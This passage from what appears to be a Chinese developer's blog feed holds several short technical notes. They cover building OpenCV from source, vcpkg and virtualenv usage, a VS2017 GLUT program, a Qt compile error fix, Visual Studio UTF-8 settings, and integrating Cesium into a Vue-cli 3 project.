<h1 id="安装必需的软件包"><a href="#安装必需的软件包" class="headerlink" title="安装必需的软件包"></a>安装必需的软件包</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[compiler] sudo apt-get install build-essential</span><br><span class="line">[required] sudo apt-get install cmake git libgtk2.0-dev pkg-config libavcodec-dev libavformat-dev libswscale-dev</span><br><span class="line">[optional] sudo apt-get install python-dev python-numpy libtbb2 libtbb-dev libjpeg-dev libpng-dev libtiff-dev libjasper-dev libdc1394-22-dev</span><br></pre></td></tr></table></figure>

<h1 id="下载OpenCV源代码"><a href="#下载OpenCV源代码" class="headerlink" title="下载OpenCV源代码"></a>下载OpenCV源代码</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;&lt;my_working_directory&gt;</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;opencv&#x2F;opencv.git</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;opencv&#x2F;opencv_contrib.git</span><br></pre></td></tr></table></figure>

<h1 id="使用CMake构建OpenCV"><a href="#使用CMake构建OpenCV" class="headerlink" title="使用CMake构建OpenCV"></a>使用CMake构建OpenCV</h1><h2 id="创建临时的build目录"><a href="#创建临时的build目录" class="headerlink" title="创建临时的build目录"></a>创建临时的build目录</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ~&#x2F;opencv</span><br><span class="line"># 查看并检出OpenCV最新发布版</span><br><span class="line">git tag</span><br><span class="line">git checkout 4.1.0</span><br><span class="line"></span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br></pre></td></tr></table></figure>

<h2 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cmake -D CMAKE_BUILD_TYPE&#x3D;Release -D CMAKE_INSTALL_PREFIX&#x3D;&#x2F;usr&#x2F;local ..</span><br><span class="line"># 可选，如使用opencv_contrib, 采用如下命令生成编译配置文件</span><br><span class="line">$ cmake -D CMAKE_BUILD_TYPE&#x3D;Release -D CMAKE_INSTALL_PREFIX&#x3D;&#x2F;usr&#x2F;local -D OPENCV_EXTRA_MODULES_PATH&#x3D;..&#x2F;..&#x2F;opencv_contrib&#x2F;modules ..</span><br><span class="line"># 可选，构建示例程序和文档</span><br><span class="line">cmake -D CMAKE_BUILD_TYPE&#x3D;Release -D CMAKE_INSTALL_PREFIX&#x3D;&#x2F;usr&#x2F;local -D BUILD_EXAMPLES&#x3D;1 -D BUILD_DOCS&#x3D;1 ..</span><br></pre></td></tr></table></figure>

<h2 id="构建OpenCV"><a href="#构建OpenCV" class="headerlink" title="构建OpenCV"></a>构建OpenCV</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">make -j3 # runs 3 jobs in parallel</span><br></pre></td></tr></table></figure>

<h2 id="安装OpenCV"><a href="#安装OpenCV" class="headerlink" title="安装OpenCV"></a>安装OpenCV</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://docs.opencv.org/4.1.0/d7/d9f/tutorial_linux_install.html" target="_blank" rel="noopener">Installation in Linux</a>, by opencv.</li>
<li><a href="https://github.com/opencv/opencv/issues/13154" target="_blank" rel="noopener">4.0.0 does not produce pkgconfig file</a>, by opencv.</li>
<li><a href="https://zh.wikipedia.org/zh-hans/Pkg-config" target="_blank" rel="noopener">Pkg-config</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
        <tag>opencv</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCode中Python调试方法</title>
    <url>/2022/01/28/VSCode%E4%B8%ADPython%E8%B0%83%E8%AF%95%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Python代码中设置了arg paser，需要手动设置，VS code的debug没有简单的添加参数的方式，需要创建launch.json文件配置调试参数，具体方法见<a href="https://blog.csdn.net/zk0272/article/details/83105574" target="_blank" rel="noopener">vscode 调试python代码时添加参数（args）</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/zk0272/article/details/83105574" target="_blank" rel="noopener">vscode 调试python代码时添加参数（args）</a>,by zk0272.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>VS2017配置GLUT开发环境</title>
    <url>/2020/12/11/VS2017%E9%85%8D%E7%BD%AEGLUT%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<p>最近需要做一个红外图像处理软件，在VS2017上使用OpenGL GLUT开发，采用Rapidcsv读取传递的CSV数据。具体代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">	readCsvData();</span><br><span class="line">	glutInit(&amp;argc, argv);</span><br><span class="line">	glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGB | GLUT_DEPTH);</span><br><span class="line">	glutInitWindowSize(ImageWidth, ImageHeight);</span><br><span class="line">	glutInitWindowPosition(200, 200);</span><br><span class="line">	glutCreateWindow(&quot;InfraRedImage&quot;);</span><br><span class="line">	initCamera();</span><br><span class="line">	&#x2F;&#x2F; 注册回调函数</span><br><span class="line">	glutDisplayFunc(sceneRender);</span><br><span class="line">	glutReshapeFunc(reshape);</span><br><span class="line">	glutKeyboardFunc(keyboard);</span><br><span class="line">	glutTimerFunc(1, update, 0);</span><br><span class="line">	glutMouseFunc(mouseClick);</span><br><span class="line">	glutMainLoop();</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.w3xue.com/exp/article/20193/26135.html" target="_blank" rel="noopener">在Visual Studio 2017上配置Glut</a>,by 凯鲁嘎吉.</li>
<li><a href="https://blog.csdn.net/bqw18744018044/article/details/81665898" target="_blank" rel="noopener">C++中创建二维数组的四种方法</a>,by BQW_.</li>
<li><a href="https://github.com/d99kris/rapidcsv" target="_blank" rel="noopener">Rapidcsv</a>,by d99kris.</li>
<li><a href="https://github.com/ArashPartow/bitmap" target="_blank" rel="noopener">bitmap</a>,by ArashPartow.</li>
<li><a href="https://blog.csdn.net/PROGRAM_anywhere/article/details/63720261" target="_blank" rel="noopener">C++中4种方式把字符串和数字连接起来</a>,by 帅东.</li>
<li><a href="https://blog.csdn.net/zxy131072/article/details/94547012?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromBaidu-1.control" target="_blank" rel="noopener">string赋值操作</a>,by zxy131072.</li>
<li><a href="http://www.lighthouse3d.com/tutorials/glut-tutorial/bitmap-fonts-and-orthogonal-projections/" target="_blank" rel="noopener">Bitmap Fonts and Orthogonal Projections</a>,by Lighthouse3d.</li>
<li><a href="https://stackoverflow.com/questions/13686482/c11-stdto-stringdouble-no-trailing-zeros" target="_blank" rel="noopener">C++11 std::to_string(double) - No trailing zeros</a>,by stackoverflow.</li>
<li><a href="https://www.codeproject.com/Questions/655714/How-to-write-openGl-offscreen-data-in-to-JPG-image" target="_blank" rel="noopener">How to write openGl offscreen data in to JPG image</a>,by codeproject.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>C/C++</tag>
        <tag>计算机图形学</tag>
        <tag>计算机仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>Vcpkg使用帮助</title>
    <url>/2022/10/26/Vcpkg%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>Vcpkg 可帮助您在 Windows、 Linux 和 MacOS 上管理 C 和 C++ 库。</p>
<h1 id="安装vcpkg"><a href="#安装vcpkg" class="headerlink" title="安装vcpkg"></a>安装vcpkg</h1><p>首先，请下载vcpkg并执行 bootstrap.bat 脚本。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; git clone https://github.com/microsoft/vcpkg</span><br><span class="line">&gt; .\vcpkg\bootstrap-vcpkg.bat</span><br></pre></td></tr></table></figure>

<h1 id="使用vcpkg"><a href="#使用vcpkg" class="headerlink" title="使用vcpkg"></a>使用vcpkg</h1><p>使用以下命令安装您的项目所需要的库：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; .\vcpkg\vcpkg install [packages to install]</span><br></pre></td></tr></table></figure>

<p>您也可以使用 <code>search</code> 子命令来查找vcpkg中集成的库:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; .\vcpkg\vcpkg search [search term]</span><br></pre></td></tr></table></figure>

<p>若您希望在 Visual Studio 中使用vcpkg，请运行以下命令 (首次启动需要管理员权限)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; .\vcpkg\vcpkg integrate install</span><br></pre></td></tr></table></figure>

<p>若您希望在 Visual Studio 中卸载vcpkg，请运行以下命令 (首次启动需要管理员权限)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&gt; .\vcpkg\vcpkg integrate remove</span><br></pre></td></tr></table></figure>

<p>卸载vcpkg只需删除vcpkg的文件夹即可。</p>
<p>导出开源库（通常在项目中使用第三方开源库时会把其拷贝到项目文件夹中使用）:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vcpkg export spdlog:x64-windows --zip</span><br></pre></td></tr></table></figure>

<p>然后将导出的开源库，放入另一台机器的vcpkg安装目录，即可使用。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://huangwang.github.io/2021/07/28/Windows%E4%B8%8BOsgEarth%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/">Windows下OsgEarth编译安装过程</a>,by huangwang.</li>
<li><a href="https://stackoverflow.com/questions/57296864/how-to-remove-vcpkg-and-all-libraries-installed-with-vcpkg" target="_blank" rel="noopener">How to remove vcpkg and all libraries installed with vcpkg</a>,by stackoverflow.</li>
<li><a href="https://zhuanlan.zhihu.com/p/153199835" target="_blank" rel="noopener">[工具]包管理工具Vcpkg 的使用</a>,by 南象.</li>
<li><a href="https://blog.51cto.com/fish/5693025" target="_blank" rel="noopener">vs2017 + vcpkg包管理工具</a>,by 爱看书的小沐.</li>
<li><a href="https://blog.songjiahao.com/archives/1067" target="_blank" rel="noopener">vcpkg安装库的导出和使用</a>,by songjiahao.</li>
<li><a href="https://blog.csdn.net/Chiyunyinlong/article/details/121732735" target="_blank" rel="noopener">C++包管理工具vcpkg</a>,by qqblack.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机图形学</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>VS2017+QT5.8.0时，新建GUI应用程序编译报错的问题</title>
    <url>/2022/02/19/VS2017%E5%8A%A0QT5-8-0%E9%94%99%E8%AF%AFC3615/</url>
    <content><![CDATA[<p>使用VS2017+QT5.8.0时，报如下错误：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">严重性	代码	说明	项目	文件	行	禁止显示状态</span><br><span class="line">错误	C3615	constexpr 函数 &quot;QAlgorithmsPrivate::qt_builtin_ctz&quot; 不会生成常数表达式 (编译源文件 BaitLaunchingstrategy.cpp)	Simulation	d:\qt\qt5.8.0\5.8\msvc2015_64\include\qtcore\qalgorithms.h	593</span><br></pre></td></tr></table></figure>

<p>解决方法请参考<a href="https://www.cxybb.com/article/qq_31175231/81065664" target="_blank" rel="noopener">VS2017/2015 静态编译Qt 5.8_帝江VII的博客-程序员宝宝</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/weixin_41546130/article/details/80245796" target="_blank" rel="noopener">使用VS2017+QT5.8.0时，新建GUI应用程序，编译报错的问题解决</a>,by 麻辣鸡丝GIS.</li>
<li><a href="https://www.cxybb.com/article/qq_31175231/81065664" target="_blank" rel="noopener">VS2017/2015 静态编译Qt 5.8_帝江VII的博客-程序员宝宝</a>,by 程序员宝宝.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Virtualenv简易教程</title>
    <url>/2018/10/09/Virtualenv%E7%AE%80%E6%98%93%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<p>virtualenv是一个创建隔离python环境的工具，主要用于解决包冲突问题。</p>
<h1 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo pip3 install virtualenv -i https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>

<h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><h2 id="创建项目的虚拟环境"><a href="#创建项目的虚拟环境" class="headerlink" title="创建项目的虚拟环境"></a>创建项目的虚拟环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd my_project_folder</span><br><span class="line">$ virtualenv venv #venv是虚拟环境名称</span><br></pre></td></tr></table></figure>
<p>执行上述命令后，将生成一个与虚拟环境同名的文件夹，包含 Python 可执行文件和 pip 库的拷贝，可用于安装其他包。</p>
<p>但是默认情况下，虚拟环境中不会包含也无法使用系统环境的global site-packages。比如系统环境里安装了 requests 模块，在虚拟环境里import requests会提示ImportError。如果想使用系统环境的第三方软件包，可以在创建虚拟环境时使用参数–system-site-packages。如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">virtualenv --system-site-packages venv</span><br></pre></td></tr></table></figure>
<p>此外可以指定虚拟环境所使用的 Python 版本，但前提是系统中已经安装了该版本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">virtualenv -p &#x2F;usr&#x2F;bin&#x2F;python2.7 venv</span><br></pre></td></tr></table></figure>
<h2 id="使用虚拟环境"><a href="#使用虚拟环境" class="headerlink" title="使用虚拟环境"></a>使用虚拟环境</h2><p>启动虚拟环境：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd venv</span><br><span class="line">source bin&#x2F;activate </span><br><span class="line">python -V</span><br></pre></td></tr></table></figure>
<p>退出虚拟环境：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>

<h1 id="virtualenvwrapper"><a href="#virtualenvwrapper" class="headerlink" title="virtualenvwrapper"></a>virtualenvwrapper</h1><p>virtualenvwrapper是virtualenv 的扩展工具，提供了一系列命令行命令，可以方便地创建、删除、复制、切换不同的虚拟环境。同时，使用该扩展后，所有虚拟环境都会被放置在同一个目录下。</p>
<h2 id="安装方法-1"><a href="#安装方法-1" class="headerlink" title="安装方法"></a>安装方法</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure>

<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>在$home/.bashrc文件中添加如下几行代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># bash -f file检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true</span><br><span class="line">if [ -f &#x2F;usr&#x2F;local&#x2F;bin&#x2F;virtualenvwrapper.sh ]; then</span><br><span class="line">   export WORKON_HOME&#x3D;$HOME&#x2F;.virtualenvs </span><br><span class="line">   source &#x2F;usr&#x2F;local&#x2F;bin&#x2F;virtualenvwrapper.sh</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h2 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h2><p>mkvirtualenv 也可以使用 virtualenv 的参数，比如 –python 来指定 Python 版本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkvirtualenv venv # 创建虚拟环境，虚拟环境目录都在 WORKON_HOME 里</span><br><span class="line"></span><br><span class="line">lsvirtualenv -b # 列出虚拟环境</span><br><span class="line"></span><br><span class="line">workon [虚拟环境名称] # 切换虚拟环境</span><br><span class="line"></span><br><span class="line">lssitepackages # 查看环境里安装了哪些包</span><br><span class="line"></span><br><span class="line">cdvirtualenv [子目录名] # 进入当前环境的目录</span><br><span class="line"></span><br><span class="line">cpvirtualenv [source] [dest] # 复制虚拟环境</span><br><span class="line"></span><br><span class="line">deactivate # 退出虚拟环境</span><br><span class="line"></span><br><span class="line">rmvirtualenv [虚拟环境名称] # 删除虚拟环境</span><br></pre></td></tr></table></figure>

<h1 id="conda-vs-pip-vs-virtualenv"><a href="#conda-vs-pip-vs-virtualenv" class="headerlink" title="conda vs. pip vs. virtualenv"></a>conda vs. pip vs. virtualenv</h1><p>Conda是一个开源包管理系统和环境管理系统，用于安装多个版本的软件包及其依赖关系，并在它们之间轻松切换。 它适用于Linux，OS X和Windows，是为Python程序创建的，但可以打包和分发任何软件。</p>
<p>Pip是一个以Python计算机程序语言写成的软件包管理系统，用于安装和管理软件包。</p>
<p>它们直接的区别如下：</p>
<p align="center">
    <img src="images/conda_compare.png" width="90%" alt="conda vs. pip vs. virtualenv"/>
</p>

<h1 id="pip使用方法"><a href="#pip使用方法" class="headerlink" title="pip使用方法"></a>pip使用方法</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 导出python安装包环境</span><br><span class="line">pip freeze &gt; requirements.txt</span><br><span class="line"># 导入requirements文件</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/60647332" target="_blank" rel="noopener">最全的Python虚拟环境使用方法</a>,by Stevent.</li>
<li><a href="https://zhuanlan.zhihu.com/p/37581807" target="_blank" rel="noopener">Pipenv：新一代Python项目环境与依赖管理工具</a>,by 李辉.</li>
<li><a href="https://zhuanlan.zhihu.com/p/109939711" target="_blank" rel="noopener">Python 修改 pip 源为国内源</a>,by 花晓星辰.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>VS2015默认保存文件为UTF8编码的方法</title>
    <url>/2022/07/27/VS2015%E9%BB%98%E8%AE%A4%E4%BF%9D%E5%AD%98%E6%96%87%E4%BB%B6%E4%B8%BAUTF8%E7%BC%96%E7%A0%81%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>Visual Studio（中文版）默认保存的文本文件是GB2312编码（代码页 936）的，默认的行尾（End of line）是CRLF的。在编译C/C++项目时会出现如下警告：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">warning C4819: The file contains a character that cannot be represented in the current code page (936). Save the file in Unicode format to prevent data loss。</span><br></pre></td></tr></table></figure>

<p>解决方法请参考<a href="https://www.123si.org/ide/article/visual-studio-is-saved-as-utf8-by-default/" target="_blank" rel="noopener">Visual Studio 默认保存为 UTF8 编码</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.123si.org/ide/article/visual-studio-is-saved-as-utf8-by-default/" target="_blank" rel="noopener">Visual Studio 默认保存为 UTF8 编码</a>,by 123si.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue-cli 3集成Cesium</title>
    <url>/2019/07/18/Vue-cli-3%E9%9B%86%E6%88%90Cesium/</url>
    <content><![CDATA[<p>之前记录了在Vue-Cli 2的基础上集成了Cesium，但现在Vue-Cli已更新到3，之前方法已不适用。在参考<a href="https://www.jianshu.com/p/0815c76d949f" target="_blank" rel="noopener">Vue-cli 3.0 + cesium 构建</a>的基础上，验证记录Vue-Cli 3脚手架工具中集成Cesium的过程。</p>
<h1 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h1><ul>
<li>node.js: v10.16.0</li>
<li>npm: 6.9.0</li>
<li>vue: 2.6.10</li>
<li>cesium: 1.45.0</li>
<li>vue-cli: 3.9.2</li>
<li>webpack: 4.28.4</li>
</ul>
<h1 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h1><ul>
<li><p>安装nodejs</p>
</li>
<li><p>安装vue-cli脚手架</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install -g @vue&#x2F;cli</span><br><span class="line">vue create my-project</span><br><span class="line">cd my-project</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure>

<ul>
<li>安装 cesium</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm i cesium --save</span><br></pre></td></tr></table></figure>

<ul>
<li>新建 vue.config.js 文件，配置内容如下:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const CopyWebpackPlugin &#x3D; require(&#39;copy-webpack-plugin&#39;)</span><br><span class="line">const webpack &#x3D; require(&#39;webpack&#39;)</span><br><span class="line">const path &#x3D; require(&#39;path&#39;)</span><br><span class="line"></span><br><span class="line">const debug &#x3D; process.env.NODE_ENV !&#x3D;&#x3D; &#39;production&#39;</span><br><span class="line">let cesiumSource &#x3D; &#39;.&#x2F;node_modules&#x2F;cesium&#x2F;Source&#39;</span><br><span class="line">let cesiumWorkers &#x3D; &#39;..&#x2F;Build&#x2F;Cesium&#x2F;Workers&#39;</span><br><span class="line">module.exports &#x3D; &#123;</span><br><span class="line">    baseUrl: &#39;&#39;,</span><br><span class="line">    devServer: &#123;</span><br><span class="line">        port: 9999</span><br><span class="line">    &#125;,</span><br><span class="line">    configureWebpack: &#123;</span><br><span class="line">        output: &#123;</span><br><span class="line">            sourcePrefix: &#39; &#39;</span><br><span class="line">        &#125;,</span><br><span class="line">        amd: &#123;</span><br><span class="line">            toUrlUndefined: true</span><br><span class="line">        &#125;,</span><br><span class="line">        resolve: &#123;</span><br><span class="line">            alias: &#123;</span><br><span class="line">                &#39;vue$&#39;: &#39;vue&#x2F;dist&#x2F;vue.esm.js&#39;,</span><br><span class="line">                &#39;@&#39;: path.resolve(&#39;src&#39;),</span><br><span class="line">                &#39;cesium&#39;: path.resolve(__dirname, cesiumSource)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        plugins: [</span><br><span class="line">            new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, cesiumWorkers), to: &#39;Workers&#39;&#125;]),</span><br><span class="line">            new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &#39;Assets&#39;), to: &#39;Assets&#39;&#125;]),</span><br><span class="line">            new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &#39;Widgets&#39;), to: &#39;Widgets&#39;&#125;]),</span><br><span class="line">            new CopyWebpackPlugin([ &#123; from: path.join(cesiumSource, &#39;ThirdParty&#x2F;Workers&#39;), to: &#39;ThirdParty&#x2F;Workers&#39;&#125;]),</span><br><span class="line">            new webpack.DefinePlugin(&#123;</span><br><span class="line">                CESIUM_BASE_URL: JSON.stringify(&#39;.&#x2F;&#39;)</span><br><span class="line">            &#125;)</span><br><span class="line">        ],</span><br><span class="line">        module: &#123;</span><br><span class="line">            unknownContextCritical: &#x2F;^.\&#x2F;.*$&#x2F;,</span><br><span class="line">            unknownContextCritical: false</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在 src/components 下新建 CesiumViewer.vue 文件，内容如下:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;cesiumContainer&quot; class&#x3D;&quot;fullSize&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &quot;CesiumViewer&quot;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.fullSize &#123;</span><br><span class="line">    display: block;</span><br><span class="line">    position: absolute;</span><br><span class="line">    top: 0;</span><br><span class="line">    left: 0;</span><br><span class="line">    border: none;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改 router.js ，引入 CesiumViewer组件，内容如下:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Vue from &#39;vue&#39;</span><br><span class="line">import Router from &#39;vue-router&#39;</span><br><span class="line">import CesiumViewer from &#39;.&#x2F;components&#x2F;CesiumViewer.vue&#39;</span><br><span class="line"></span><br><span class="line">Vue.use(Router)</span><br><span class="line"></span><br><span class="line">export default new Router(&#123;</span><br><span class="line">  routes: [</span><br><span class="line">    &#123;</span><br><span class="line">      path: &#39;&#x2F;&#39;,</span><br><span class="line">      name: &#39;CesiumViewer&#39;,</span><br><span class="line">      component: CesiumViewer</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<ul>
<li>修改App.vue ，内容如下：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;router-view&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang&#x3D;&quot;css&quot;&gt;</span><br><span class="line">  html, body, #cesiumContainer &#123;</span><br><span class="line">    width: 100%;</span><br><span class="line">    height: 100%;</span><br><span class="line">    margin: 0;</span><br><span class="line">    padding: 0;</span><br><span class="line">    overflow: hidden;</span><br><span class="line">  &#125;</span><br><span class="line">  #app &#123;</span><br><span class="line">    font-family: &#39;Avenir&#39;, Helvetica, Arial, sans-serif;</span><br><span class="line">    -webkit-font-smoothing: antialiased;</span><br><span class="line">    -moz-osx-font-smoothing: grayscale;</span><br><span class="line">    text-align: center;</span><br><span class="line">    color: #2c3e50;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>最后修改 main.js 内容如下:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Vue from &#39;vue&#39;</span><br><span class="line">import App from &#39;.&#x2F;App.vue&#39;</span><br><span class="line">import router from &#39;.&#x2F;router&#39;</span><br><span class="line">import store from &#39;.&#x2F;store&#39;</span><br><span class="line">import Cesium from &#39;cesium&#x2F;Cesium&#39;</span><br><span class="line">&#x2F;&#x2F; noinspection ES6UnusedImports</span><br><span class="line">import widget from &#39;cesium&#x2F;Widgets&#x2F;widgets.css&#39;</span><br><span class="line"></span><br><span class="line">Vue.config.productionTip &#x3D; false</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">  router,</span><br><span class="line">  store,</span><br><span class="line">  render: h &#x3D;&gt; h(App),</span><br><span class="line">  mounted () &#123;</span><br><span class="line">    var viewer &#x3D; new Cesium.Viewer(&#39;cesiumContainer&#39;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).$mount(&#39;#app&#39;)</span><br></pre></td></tr></table></figure>

<ul>
<li>最后 npm serve ，打开浏览器输入localhost:8080查看效果。</li>
</ul>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><p>不应将viewer定义在vue组件的data对象中，因为vue会劫持数据，导致cesium卡顿。具体请参考<a href="https://blog.csdn.net/qq_35561548/article/details/109613401" target="_blank" rel="noopener">vue+cesium cesium数据量太大导致浏览器卡顿解决办法</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.jianshu.com/p/0815c76d949f" target="_blank" rel="noopener">Vue-cli 3.0 + cesium 构建</a>,by QingMings.</li>
<li><a href="http://cesium.marsgis.cn/forcesium/tutorials/cesium-and-webpack/" target="_blank" rel="noopener">cesium-and-webpack</a>,by marsgis.</li>
<li><a href="https://huangwang.github.io/2018/05/11/Vue-js%E9%9B%86%E6%88%90Cesium/">Vue.js集成Cesium</a>,by jack huang.</li>
<li><a href="https://segmentfault.com/a/1190000022714154" target="_blank" rel="noopener">Cesium笔记 — Vue+Cesium开发环境搭建（基于Cesium1.69）</a>,by 芒果香蕉.</li>
<li><a href="https://blog.csdn.net/qq_35561548/article/details/109613401" target="_blank" rel="noopener">vue+cesium cesium数据量太大导致浏览器卡顿解决办法</a>,by 浮年似水.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>vuejs</tag>
      </tags>
  </entry>
  <entry>
    <title>Visual_Studio_Community_2017离线安装</title>
    <url>/2018/06/21/Visual-Studio-Community-2017%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85/</url>
